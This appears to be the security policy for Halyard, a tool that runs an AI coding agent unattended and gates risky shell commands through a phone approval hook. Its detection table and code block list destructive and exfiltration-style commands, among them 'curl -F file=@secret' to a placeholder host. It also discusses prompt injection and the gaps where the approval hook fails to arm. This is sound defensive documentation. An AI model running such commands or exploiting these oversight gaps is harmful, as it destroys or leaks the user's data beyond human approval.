# Security

Halyard gives a language model a shell on your computer and a way to be triggered from your
phone. That is the feature. This document is about how long the leash is, where it is
attached, and what it is explicitly not tied to.

Read the threat model first. Most questions about a specific setting are really questions
about which row of that table you are in.

---

## Threat model

| Threat | Covered? | How |
|---|---|---|
| Someone on your LAN or the internet reaching the bridge | **Yes** | Binds `127.0.0.1` by default. Remote access is meant to come through a tunnel that terminates TLS and authenticates the device. No listening port is exposed. |
| Someone who reaches the port anyway | **Partly** | Every route needs a 192-bit bearer token, compared in constant time. That is one factor and the only one. |
| An unattended run doing something irreversible | **Partly** | The approve/deny relay stops mutating git, recursive deletes and outbound data and asks your phone. It is a backstop, not a sandbox. |
| An agent reading or writing outside its remit | **Partly** | The workspace is a single configured directory, passed to the agent as its allowed scope. Enforcement is the **agent's**, not Halyard's. |
| Reading arbitrary files back over HTTP | **Yes** | The log route is an allow-list of names mapped to absolute paths, never a path from the query. Artifacts are containment-checked. Thread names are an allow-list of `[a-z0-9-]`. |
| A reply injecting markup into the page | **Yes** | The page escapes first, then re-adds a fixed set of tags. Nothing else survives. |
| Your reply text being readable by a third party | **Yes**, for Web Push | RFC 8291 end-to-end encryption. The push service relays bytes it cannot read. *(The optional ntfy path does **not** do this — see below.)* |
| A stolen token | **No** | A token is a bearer credential. Anyone holding it can queue work. `halyard token --rotate` is the response. |
| A malicious or compromised agent CLI | **No** | Halyard executes the binary you configured. It is not a sandbox and does not try to be. |
| Prompt injection through content the agent reads | **No** | If your agent reads a hostile web page and is talked into running something, the relay is your only line — and only for the three command families it matches. |

---

## The token

- 24 random bytes from the CSPRNG, base64url, written `0600`, generated once at setup.
- Sent as `?token=`, an `Authorization: Bearer` header, or a `SameSite=Strict` cookie the
  server sets on first use.
- Compared with `timingSafeEqual` over SHA-256 digests of both sides — hashing first because
  `timingSafeEqual` throws on a length mismatch, and that throw is itself a length oracle.
- **Not rotated automatically.** It is baked into the PWA's `start_url` and into every push
  payload already delivered; silently rotating it would log your phone out with no
  explanation. `halyard token --rotate` is explicit, and every device must reopen the link.

The token appears in URLs, so it lands in browser history and, over plain HTTP, in any
intermediary's logs. Over a TLS tunnel it does not leave the tunnel.

---

## The approve/deny relay

A pre-tool hook. Before the agent runs a shell command, the hook inspects it, and if it
matches a rule the command is held while your phone is asked.

### It arms only for unattended runs

In an interactive session at your own keyboard the relay is not a backstop, it is an
obstacle: it re-asks, on a phone, a question the local session could ask instantly, and
denies on a five-minute timeout if nobody is holding the phone.

Two independent signals, either sufficient, because they fail in different directions:

- `HALYARD_HEADLESS=1`, set by the watcher on the process it starts. Ours, definitive,
  survives an agent renaming its modes.
- The permission mode the agent reports, which covers an unattended run Halyard did not
  start.

`ATTENDED_MODES` is an **allow-list**. A mode the hook has never heard of relays, because an
unnecessary relay costs one tap and a skipped one costs the whole backstop.

### What it matches

| Rule | Matches | Deliberately does not |
|---|---|---|
| `git` | `add commit push checkout switch branch merge rebase reset revert tag stash restore clean cherry-pick rm mv`, including `git -C <path> push` and `git -c k=v commit` | `status`, `log`, `diff`, `fetch` |
| `destructive-fs` | recursion: `rm -rf`, `rm --recursive`, `rmdir /s`, `Remove-Item -Recurse`, `mkfs`, `diskpart`, `Format-Volume` | `rm -f one-file.txt` |
| `network-egress` | requests with a body or a non-GET method, `scp`/`rsync` to a remote target, mutating `gh` subcommands | plain GETs, and loopback-only requests |

Two matches worth calling out, because both are the obvious way to write the command you
would least want unrelayed:

```sh
sh -c "git push --force"                    # quoted — still matched
powershell -Command "git reset --hard"      # quoted — still matched
curl -F file=@secret https://example.com    # flag before the URL — still matched
gh pr create --title x                      # never invokes git — still matched
```

### Two things it must never become

**Do not skip matches inside quotes.** It is the obvious fix for false positives and it is a
genuine bypass — both quoted examples above execute. Sorting inert text from executed text
on a shell command line is not decidable by pattern.

**Do not narrow the tool matcher to one tool.** Two places have to agree and they fail in
opposite directions: your agent's hook matcher decides which tools ever reach the hook, and
`RELAYED_TOOLS` inside the hook decides what happens once there. A tool missing from the
matcher never reaches the script no matter what the script says. A tool missing from
`RELAYED_TOOLS` reaches it and is waved through. `test/smoke.js` asserts they agree.

### Failure behaviour

- Bridge unreachable → **deny**.
- No answer within five minutes → **deny**.
- A deny fails **that command**, not the whole run — the agent gets an error it can react to.
- The hook never exits without emitting a decision first. An unhandled exception in a
  permission hook is not something to gamble on as an allow.

### Engines without a hook

Not every agent CLI exposes a pre-tool hook. For one that does not, the relay **cannot
arm** — a mutating git command from that engine runs with no human in the loop, while the
identical command from a hooked engine waits for a tap.

Halyard does not hide this. `halyard doctor` prints it, the phone's engine picker labels it
`(no relay)`, and the configuration audit warns when your default engine is one of them. Do
not read "the relay covers this" as true of every engine.

---

## Scope

`workspace` is the single directory the agent is given as its allowed scope. It defaults to
the working directory at setup time, **not** your home directory.

The enforcement is the agent's, not Halyard's. Halyard passes the directory and warns when
your choice is wide:

```
!  Workspace is /home/you, which contains your whole home directory. Narrow it unless you mean it.
```

If you need real containment, run the agent inside a container or VM and point Halyard's
engine `command` at that. Halyard is deliberately not in the sandboxing business — a
half-sandbox that people trust is worse than none.

---

## Permission mode

Passed straight through to the agent. `default` means the agent's own rules apply.

Looser modes are exactly what makes an unattended bridge useful, and exactly what makes the
relay load-bearing. The audit says so in as many words:

```
!  permissionMode is "bypassPermissions". Tool calls will not prompt locally,
   so the approve/deny relay is your only backstop.
```

If you set a bypass mode **and** disable the relay **and** widen the workspace to your home
directory, you have built a thing that will, unattended, do anything to anything you own.
That is a legitimate configuration for some people and Halyard will run it. It will just
tell you, every time it starts, exactly what you built.

---

## Network

- Default bind is `127.0.0.1`. Binding anything else prints a warning naming the exposure.
- Use a tunnel, not an open port: Tailscale Serve, Cloudflare Tunnel, or an SSH forward.
- **HTTPS is functional, not cosmetic.** Over plain HTTP the browser's `PushManager` does
  not exist and you silently drop to in-page alerts. The page says which tier is in force.
- Responses carry `no-store` and `X-Content-Type-Options: nosniff`. The page loads no
  third-party resources at all.

---

## Delivery paths

**Web Push** (default): RFC 8291 payload encryption and RFC 8292 VAPID on `node:crypto`
alone. The push service sees ciphertext. `test/smoke.js` plays the browser's side — it
generates a UA keypair exactly as the Push API does and decrypts what Halyard produced, from
the wire bytes alone — because otherwise the failure mode is a 201, a clean log, and
notifications that never arrive.

The payload carries a tokened URL, because a notification tap with no tab open has to open
one and a bare `/` is the 401 page. This is not a new disclosure: the payload is encrypted
to the browser that subscribed, which already holds that token.

Subscriptions are pruned **only** on 404/410 — the service saying the endpoint is
permanently dead. A transient 5xx, or a phone that is merely offline, never silently
unsubscribes anyone.

**ntfy.sh** (opt-in, off by default): posts your reply text **in plaintext to a public
third-party server**. It is kept because it works on devices where Web Push does not, but
it is not private, and enabling it is a decision to send reply text off your machine.

---

## Data at rest

Everything is in your data directory:

| File | Contents | Notes |
|---|---|---|
| `token.txt` | the bearer token | mode `0600` |
| `push-keys.json` | VAPID private key | mode `0600` |
| `push-subs.json` | push endpoints | |
| `state.json` | queue + last 30 replies | |
| `replies.jsonl` | **every reply, permanently** | the only durable copy |
| `runs.jsonl` | per-run cost ledger | |
| `threads/*.session` | agent session ids | |
| `halyard.log` | request and run log | rotated at 8 MB |

Not encrypted at rest. It is a directory in your user profile with the same protection as
the rest of your files. `replies.jsonl` in particular accumulates everything the agent has
ever told you — including anything it quoted out of your code.

Nothing is in the repository, so `git pull` cannot clobber it and `git clean -xdf` cannot
delete it.

---

## Reporting a vulnerability

Open a private security advisory on the repository, or email the maintainer listed there.
Please do not open a public issue for anything that would let someone else reach a running
bridge.

Things that are **not** vulnerabilities, because they are the documented design:

- The token is a bearer credential and grants full access.
- The agent can modify files inside its configured workspace.
- Bypass permission modes bypass permissions.
